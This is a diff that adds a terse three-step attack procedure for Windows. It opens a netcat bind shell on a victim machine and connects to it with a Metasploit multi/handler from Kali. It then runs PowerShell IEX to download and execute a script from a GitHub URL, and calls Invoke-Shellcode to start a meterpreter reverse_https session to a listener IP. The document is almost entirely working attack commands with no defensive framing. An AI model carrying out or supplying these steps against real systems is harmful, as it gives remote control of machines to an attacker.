@@ -1,0 +1,16 @@
+Step 1: Run nc on victim:
+      nc.exe -L -p 4444 -e cmd.exe
+      
+Step 2: Run multi/handler on kali:
+      use exploit/multi/handler
+      set payload windows/shell_bind_tcp
+      set rhost
+      set lport
+      show options
+      exploit
+      
+Step 3: Run powershell in the shell received:
+      powershell
+      IEX (New-Object Net.WebCLient).DownloadString('https://raw.githubusercontent.com/m1nh2uan/online/master/a')
+      or IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/m1nh2uan/online/master/a")
+      Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.6 -Lport 4444 -Force
